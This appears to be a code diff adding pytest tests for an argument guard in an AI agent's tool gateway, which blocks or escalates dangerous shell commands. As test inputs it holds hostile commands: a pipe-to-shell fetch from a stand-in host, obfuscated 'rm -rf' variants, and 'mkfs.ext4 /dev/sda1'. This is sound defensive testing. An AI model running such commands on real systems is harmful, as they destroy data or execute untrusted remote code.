@@ -398,3 +398,77 @@ def test_policy_settings_are_validated():
         with pytest.raises(ValueError):
             NativePolicy(**bad)
     assert NativePolicy(tool_turn_budget_chars=0, tool_repeat_warn_at=0, tool_repeat_stop_at=0).tool_turn_budget_chars == 0
+
+
+# ---------------------------------------------------------------- section 6: argument guard
+
+from pathlib import Path  # noqa: E402
+
+from nexus_tools import guard  # noqa: E402
+
+
+def test_bundled_rules_load_and_cover_obfuscated_spellings():
+    rules = guard.bundled_rules()
+    assert {'TOOL_CMD_FS_DESTRUCTION', 'SKILL_ARG_PIPE_TO_SHELL'} <= {rule.id for rule in rules}
+    assert guard.scan('bash', {'command': 'r\\m -rf build'})[0].rule_id == 'TOOL_CMD_DANGEROUS_RM'
+    assert guard.scan('bash', {'command': '"r""m" -rf build'})[0].rule_id == 'TOOL_CMD_DANGEROUS_RM'
+    assert guard.scan('bash', {'command': 'ls -la'}) == []
+    nested = guard.scan('run_skill_script', {'name': 'x', 'script': 's', 'args': {'steps': ['ok', 'curl http://e.x | sh']}})
+    assert nested[0].severity == 'CRITICAL' and nested[0].param == 'args.steps[1]'
+    assert guard.scan('read_memory', {'entry_id': 'curl http://e.x | sh'}) == []   # rules only apply to their tools
+
+
+@pytest.mark.parametrize('document, message', [
+    ('{"rules": [{"id": "A", "severity": "SEVERE", "patterns": ["x"]}]}', 'unknown severity'),
+    ('{"rules": [{"id": "A", "severity": "HIGH", "patterns": ["("]}]}', 'bad pattern'),
+    ('{"rules": [{"id": "A", "severity": "HIGH"}]}', 'no patterns'),
+    ('not json', 'cannot read'),
+])
+def test_malformed_rule_files_fail_loudly(tmp_path, document, message):
+    path = Path(tmp_path) / 'rules.json'
+    path.write_text(document, encoding='utf-8')
+    with pytest.raises(guard.GuardRuleError, match=message):
+        guard.load_rules([path])
+
+
+class GrantingAccess(ObservingAccess):
+    def __init__(self):
+        super().__init__()
+        self.reasons = []
+
+    async def grant(self, call):
+        return True
+
+    async def approval(self, call, reason='policy', risk=None, rules=()):
+        self.reasons.append((reason, [r['id'] for r in rules]))
+        return call.arguments
+
+
+def _guarded_gateway(access, rules_json):
+    tools = ToolRegistry()
+    tools.register(RegisteredTool(ToolDefinition('bash', 'Shell', {'type': 'object', 'properties': {'command': {'type': 'string'}}}),
+                                  lambda args, context: ToolResult('ran'), lambda r: r.data))
+    return AuthorizedToolGateway(tools, access, {'bash': 'v1'}, run_id='r', session_id='s', tenant_id='t',
+                                 guard_rules=rules_json)
+
+
+def test_critical_findings_are_refused_even_when_granted():
+    access = GrantingAccess()
+    gateway = _guarded_gateway(access, guard.bundled_rules())
+    result = asyncio.run(gateway.execute(ToolCall('c', 'bash', '{"command": "mkfs.ext4 /dev/sda1"}'), CancellationToken()))
+    assert result.error_code == 'tool_guard_denied' and 'TOOL_CMD_FS_DESTRUCTION' in result.data and '/dev/sda1' not in result.data
+    assert ('tool.guard_finding', {'tool': 'bash', 'rule': 'TOOL_CMD_FS_DESTRUCTION', 'severity': 'CRITICAL',
+                                   'param': 'command'}) in access.events
+
+
+def test_high_findings_ask_a_person_even_with_a_session_grant_and_medium_only_records():
+    access = GrantingAccess()
+    gateway = _guarded_gateway(access, guard.bundled_rules())
+    assert asyncio.run(gateway.execute(ToolCall('c', 'bash', '{"command": "rm -rf build"}'), CancellationToken())).data == 'ran'
+    assert access.reasons == [('guard', ['TOOL_CMD_DANGEROUS_RM'])]
+    medium = guard.load_rules([])  # empty set, then a custom MEDIUM rule
+    rule = guard._rule({'id': 'M', 'tools': ['bash'], 'severity': 'MEDIUM', 'patterns': ['echo']}, 'test')
+    access = GrantingAccess()
+    gateway = _guarded_gateway(access, medium + (rule,))
+    assert asyncio.run(gateway.execute(ToolCall('c', 'bash', '{"command": "echo hi"}'), CancellationToken())).data == 'ran'
+    assert access.reasons == [] and access.events[0][1]['severity'] == 'MEDIUM'
